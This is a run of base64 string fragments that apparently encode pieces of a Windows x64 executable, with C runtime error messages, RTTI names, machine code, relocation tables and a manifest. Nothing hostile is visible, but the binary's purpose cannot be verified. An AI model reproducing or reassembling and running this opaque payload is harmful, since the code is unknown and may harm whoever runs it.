AAAAAUgA2ADAAMQAwAA0ACgAtACAAYQBiAG8AcgB0ACgAKQAgAGgAYQBzACAAYgBlAGUAbgAgAGMAYQBsAGwAZQBkAA0ACgAAAAAAAAAAAAAAAABSADYAMAAxADYADQAKAC0AIABuAG8AdAAgAGUAbgBvAHUAZwBoACAAcwBwAGEAYwBlACAAZgBvAHIAIAB0AGgAcgBlAGEAZAAgAGQAYQB0AGEADQAKAAAAAAAAAAAAAABSADYAMAAxADcADQAKAC0AIAB1AG4AZQB4AHAAZQBjAHQAZQBkACAAbQB1AGwAdABpAHQAaAByAGUAYQBkACAAbABvAGMAawAgAGUAcgByAG8AcgANAAoAAAAAAAAAAABSADYAMAAxADgADQAKAC0AIAB1AG4AZQB4AHAAZQBjAHQAZQBkACAAaABlAGEAcAAgAGUAcgByAG8AcgANAAoAAAAAAAAAAAAAAAAAAAAAAFIANgAwADEAOQANAAoALQAgAHUAbgBhAGIAbABlACAAdABvACAAbwBwAGUAbgAgAGMAbwBuAHMAbwBsAGUAIABkAGUAdgBpAGMAZQANAAoAAAAAAAAAAAAA','AAAAAAAAAAAAAAAAAAAACAAAAWIoBAAAAAAAAAAAAcIoBAMiJAQAAAAAAAAAAAAAAAAAAAAAAAMABAAEAAAAAAAAA/////wAAAABAAAAAQIoBAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAFDAAQDAigEAmIoBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAADYigEAAAAAAAAAAADwigEAyIkBAAAAAAAAAAAAAAAAAAAAAABQwAEAAQAAAAAAAAD/////AAAAAEAAAADAigEAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAeMABAECLAQAYiwEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwAAAFiLAQAAAAAAAAAAAHiLAQDwigEAyIkBAAAAAAAAAAAAAAAAAAAAAAAAAAAAeMABAAIAAAAAAAAA/////wAAAABAAAAAQIsBAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAKDAAQDIiwEAoIsBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAADgiwEAAAAAAAAAAAAAjAEA8IoBAMiJAQAAAAAAAAAAAAAAAAAAAAAAAAAAAKDAAQACAAAAAAAAAP////8AAAAAQAAAAMiLAQAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAADQwAEAUIwBACiMAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAaIwBAAAAAAAAAAAAeIwBAAAAAAAAAAAAAAAAANDAAQAAAAAAAAAAAP////8AAAAAQAAAAFCMAQAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAowAEA8IkBAKCMAQAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAaMwBAPCMAQDIjAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAiNAQAAAAAAAAAAACCNAQDIiQEAAAAAAAAAAAAAAAAAAAAAAGjMAQABAAAAAAAAAP////8AAAAAQAAAAPCMAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAACIjgEAAAAAAAAAAAAY1AEAAAAAAAAAAAD/////AAAAAEAAAABIjQEAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAAoI0BAAAAAAAAAAAAmI4BAOiNAQBgjQEAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAABI1AEAGI8BAMCNAQAAAAAAAAAAAAAAAAAAAAAASNQBAAEAAAAAAAAA/////wAAAABAAAAAGI8BAAAAAAAAAAAAAAAAAKjTAQACAAAAAAAAAP////8AAAAAQAAAAMCOAQAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAY1AEASI0BADiOAQAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAqNMBAMCOAQBgjgEAAAAAAAAAAAAAAAAAAAAAAGCNAQAAAAAAAAAAAAAAAADg0wEAAgAAAAAAAAD/////AAAAAEAAAACIjQEAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAAMI8BAAAAAAAAAAAAAQAAAAAAAAAAAAAA4NMBAIiNAQDYjgEAAAAAAAAAAAAAAAAAAAAAAOiNAQBgjQEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAACPAQAAAAAAAAAAABCOAQDojQEAYI0BAAAAAAAAAAAAAAAAAAAAAAAAAAAAwJEBAGiUAQColQEAAAAAAAAAAAAAAAAAAAAAAAAAAADokQEAQJQBAKiVAQAAAAAAAAAAAAAAAAAAAAAAAAAAABCSAQBolAEAqJUBAAAAAAAAAAAAAAAAAAAAAAAAAAAAOJIBAECUAQColQEAAAAAAAAAAAAAAAAAAAAAAAAAAABgkgEAaJQBAKiVAQAAAAAAAAAAAAAAAAAAAAAAAAAAAIiSAQBAlAEAqJUBAAAAAAAAAAAAAAAAAAAAAAAAAAAAsJIBAAAAAAAAAAAAAAAAANiSAQBAlAEAqJUBAAAAAAAAAAAAAAAAAAAAAAAAAAAAKJMBAGiUAQColQEAAJMBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFCTAQCQlAEAAAAAAAAAAAAAAAAAAAAAAHiTAQBolAEAqJUBAAAAAAAAAAAAAAAAAAAAAAAAAAAAoJMBAGiUAQColQEAAAAAAAAAAAAAAAAAAAAAAAAAAADwkwEAaJQBAKiVAQDIkwEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGJQBAGiUAQColQEAAAAAAAAAAAAAAAAAAAAAAAAAAABAlAEAqJUBAAAAAAAAAAAAAAAAAAAAAABolAEAqJUBAAAAAAAAAAAAAAAAAAAAAACQlAEAAAAAAAA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CAAAAAEWFyXQyixKLSUA70XIIM8BIg8QgW8NCjQQKO8F2ByvKQYkK6wNFiQpFiwJJA1M4SIvL6CFAAAC4AQAAAEiDxCBbw8zMzMzMzEiJTCQIU0iD7DBIx0QkIP','AAAAYHZlY3RvciBkZWxldGluZyBkZXN0cnVjdG9yJwAAAABgZGVmYXVsdCBjb25zdHJ1Y3RvciBjbG9zdXJlJwAAAGBzY2FsYXIgZGVsZXRpbmcgZGVzdHJ1Y3RvcicAAAAAYHZlY3RvciBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAABgdmVjdG9yIGRlc3RydWN0b3IgaXRlcmF0b3InAAAAAGB2ZWN0b3IgdmJhc2UgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAAABgdmlydHVhbCBkaXNwbGFjZW1lbnQgbWFwJwAAAAAAAGBlaCB2ZWN0b3IgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAAAAAAABgZWggdmVjdG9yIGRlc3RydWN0b3IgaXRlcmF0b3InAGBlaCB2ZWN0b3IgdmJhc2UgY29uc3RydWN0b3IgaXRlcmF0b3InAABgY29weSBjb25zdHJ1Y3RvciBjbG9zdXJlJwAAAAAAAGB1ZHQgcmV0dXJuaW5nJwBgRUgAYFJUVEkAAAAAAAAAYGxvY2FsIHZmd','wkMEiNTCRwTIvISIlMJCgzyUyLxkiJXCQg/xVSfgAA/8eD/wJ8sUiDxEBfXlvDzMzMSIsFSWkBAEgzBRIuAQB0A0j/4Ej/JVZ+AADMzEiLBTVpAQBIMwX2LQEAdANI/+BI/yVSfgAAzMxIiwUhaQEASDMF2i0BAHQDSP/gSP8lJn4AAMzMSIsFDWkBAEgzBb4tAQB0A0j/4Ej/JRJ+AADMzEBTSIPsIIsFNDcBADPbhcB5L0iLBadpAQCJXCQwSDMFjC0BAHQRSI1MJDAz0v/Qg/h6jUMBdAKLw4kFATcBAIXAD5/Di8NIg8QgW8NAU0iD7CBIjQ2PpAAA/xXJfQAASI0VoqQAAEiLyEiL2P8V5nwAAEiNFZ+kAABIi8tIMwUtLQEASIkFVmgBAP8VyHwAAEiNFYmkAABIMwUSLQEASIvLSIkFQGgBAP8VqnwAAEiNFXukAABIMwX0LAEASIvLSIkFKmgBAP8VjHwAAEiNFW2kAABIMwXWLAEASIvLSIkFFGgBAP8VbnwAAEiNFW+kAABIMwW4LAEASIvLSIkF/mcBAP8VUHwAAEiNFWmkAABIMwWaLAEASIvLSIkF6GcBAP8VMnwAAEiNFWOkAABIMwV8LAEASIvLSIkF0mcBAP8VFHwAAEiNFV2kAABIMwVeLAEASIvLSIkFvGcBAP8V9nsAAEiNFVekAABIMwVALAEASIvLSIkFpmcBAP8V2HsAAEiNFVmkAABIM','AAAGXgAAZJwBAAheAABBXgAAQJwBAEReAACtXgAAPJ0BALBeAAD2XgAApJwBAPheAACgXwAAnJwBAKBfAABvYAAArJwBAHhgAADBYAAAnJwBAMRgAACVYQAATKYBAJhhAACrYQAAZJwBAKxhAABHYgAAuJwBAEhiAACsYgAAwJwBAKxiAAAJYwAA7JwBAAxjAABWYwAAFJ0BAFhjAADXYwAAPJ0BANhjAACJZAAARJ0BAKBkAAAdZQAAWJ0BADxlAACbZgAAXJ0BAJxmAADZZgAAtKcBANxmAAD8ZwAAfJ0BABBoAAC4aAAAqJ0BALhoAACXaQAArJ0BAJhpAABhagAANJ4BAGRqAACQawAAGJ4BAJBrAAAkbAAAuJ0BACRsAADFbAAAXJ4BAMhsAAAZbQAA8J0BABxtAABfbQAAnJwBAGBtAAC+bQAAQJwBAMBtAADVbQAAZJwBANhtAADtbQAAZJwBAPBtAAAibgAAnJwBACRuAAA/bgAAnJwBAEBuAABbbgAAnJwBAFxuAADRbwAAzJ0BANRvAABbcAAATJ4BAFxwAACJcAAAnJwBAKhwAADScAAAnJwBAORwAAAocQAAQJwBAChxAABhcQAAQJwBAGRxAAC+cQAAcJ4BAMBxAADncQAAnJwBAPxxAAACcwAAgJ4BAARzAABFcwAAnJwBAEhzAABecwAAnJwBAGBzAACmdAAAQJwBAKh0AADOdAAAnJwBAOB0AACPdQAAQJwBAJx1AADndQAAnJwBAOh1AAAbdgAAiJ4BABx2AABVdgAAQJwBAHB2AAAFeAAAlJ4BAAh4AABBeAAAZJwBAER4AADEeAAACKMBAMR4AAA/eQAACKMBAEB5AADCeQAACKMBAMR5AACiewAAxJ4BAKR7AADnewAAZJwBABh8AACHfgAA4J4BAKR+AAD5fgAAZJwBAAR/AABBfwAA8J8BAGB/AADHfwAACJ8BAMh/AAA0gAAADJ8BADSAAADqgAAAtKcBAOyAAAAfgQAAnJwBALSBAABKgwAAwJ8BAPCDAABlhAAALJ8BAGiEAADKhAAAQJwBAMyEAAD0hAAAZJwBAPSEAABxhQAAPJ0BAHSFAAAChgAAwJ8BAASGAADlhwAA1J8BAOiHAACiiAAATJ8BAKSIAAAAiwAAcJ8BAACLAACujQAAoJ8BALCNAAAWjgAA8J8BABiOAABhjgAA+J8BAGSOAACXjwAACKABAJiPAADUjwAAnJwBANSPAAD4jwAAnJwBAPiPAAB6kAAAQJwBAHyQAAA+kQAAPKABAECRAAC/kQAAnJwBAMCRAADkkQAAZJwBAOyRAABZkgAAcKABAFySAADNkgAAfKABAECTAACMkwAAnJwBAIyTAAAOlwAAnJwBABCXAAAvlwAAnJwBADCXAABQlwAAnJwBAFCXAABwlwAAqKABAHCXAACPlwAAiKABAJCXAACtlwAAZJwBALCXAACLmAAAyKABAIyYAADTmAAA2KABANSYAADGmQAAAKEBANCZAAA1mgAAIKEBADiaAABWmgAA+KABAFiaAACTmgAAZJwBAJSaAAAfnAAANKEBACCcAABApgAASKEBAECmAACGpgAAnJwBAIimAADZpgAAbKEBANymAABwpwAAgKEBAHCnAACQpwAAZJwBAJCnAADepwAAQJwBAOCnAAAAqAAAZJwBAGCoAABqqQAAmKEBAGypAAA4qwAAwJ8BAEyrAABsqwAAZJwBAHirAACkrgAAnKEBAKSuAAAXrwAAtKcBABivAAALsAAA5KEBAAywAADTsQAAGJ4BANSxAAAFswAAIKEBAAizAAC0swAA9KEBALSzAACotAAAAKIBAKi0AADgtAAAQJwBAOC0AAAYtQAAQJwBABi1AACGtQAAOKMBAIi1AACptQAAnJwBALy1AAD1tQAAQJwBAPi1AAC5tgAAxKIBALy2AABwuwAAqKIBAHC7AADVvQAAIKMBANi9AACvvgAAWKMBANS+AACKvwAA3KIBAIy/AACJwQAAjKMBAIzBAACPwwAAGKIBAJDDAADjwwAAZJwBAOTDAAB2xQAAZKIBAHjFAACcxwAAdKMBAJzHAAC6yAAACKMBALzIAADjyAAAZJwBAOTIAAANyQAAnJwBABzJAABXyQAAQJwBAGDJAADpyQAAwJ8BAOzJAAAJygAAZJwBAAzKAABvygAAnJwBAHDKAADRygAAnJwBANTKAAAYywAAQJwBABjLAACfywAAwJ8BAKDLAABbzAAAvKMBAFzMAAC7zAAAtKcBADDNAAB9zQAA5KMBALDNAADpzQAAQJwBACTOAABI0AAACKQBAEjQAAAb0QAAtKcBABzRAAC20QAAQJwBANDRAAD00QAAOKQBAADSAAAY0gAAQKQBACDS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YK1wrYCtkK2grbCtwK3QreCt8K0ArhCuIK4wrkCuUK5grnCugK6QrqCusK7ArtCu4K7wrgCvEK8grzCvQK9Qr2CvcK+Ar5CvoK+wr8Cv0K/gr/CvAAAAUAEACAIAAACgEKAgoDCgQKBQoGCgcKCAoJCgoKCwoMCg0KDgoPCgAKEQoSChMKFAoVChYKFwoYChkKGgobChwKHQoeCh8KEAohCiIKIwokCiUKJgonCigKKQoqCisKLAotCi4KLwogCjEKMgozCjQKNQo2CjcKOAo5CjoKOwo8Cj0KPgo/CjAKQQpCCkMKRApFCkYKRwpICkkKSgpLCkwKTQpOCk8KQApRClIKUwpUClUKVgpXClgKWQpaClsKXApdCl4KXwpQCmEKYgpjCmQKZQpmCmcKaAppCmoKawpsCm2KbopvimCKcYpyinOKdIp1inaKd4p4inmKeop7inyKfYp+in+KcIqBioKKg4qEioWKhoqHioiKiYqKiouKjIqNio6Kj4qAipGKkoqTipSKlYqWipeKmIqZipqKm4qcip2KnoqfipCKoYqiiqOKpIqliqaKp4qoiqmKqoqriqyKrYquiq+KoIqxirKKs4q0irWKtoq3iriKuYq6iruKvIq9ir6Kv4qwisGKworDisSKxYrGiseKyIrJisqKy4rMis2KzorPisCK0YrSitOK1IrVitaK14rYitmK2orbityK3Yreit+K0IrhiuKK44rkiuWK5orniuiK6YrqiuuK7Irtiu6K74rgivGK8orzivSK9Yr2iveK+Ir5ivqK+4r8iv2K/or/ivAGABAKwAAAAIoBigKKA4oEigWKBooHigiKCYoKiguKDIoNig6KD4oAihGKEooTihSKFYoWiheKGIoZihqKG4ocih2KHoofihCKIYoiiiOKJIoliiaKJ4ooiimKKooriiyKLYouii+KIIoxijKKM4o0ijWKNoo3ijiKOYo6ijuKPIo9ij6KP4owikGKQopDikSKRYpGikeKSIpJikqKS4pMik2KTopPikCKUAAABwAQDMAAAAcKB4oICgiKCQoJigoKCooLCguKDAoMig0KDYoOCg6KDwoPigAKEIoRChGKEgoSihMKE4oUChSKFQoVihYKFooXCheKGAoYi','7///9Ni9BIi9lIjQVQbgEASIkBSIlRCEyJQShJi0AIRA+3SAhmRIlJEEmLQAhEi0AMRIlBFEmLQgiLSBSJSxhJi0IISItIIEiJSyB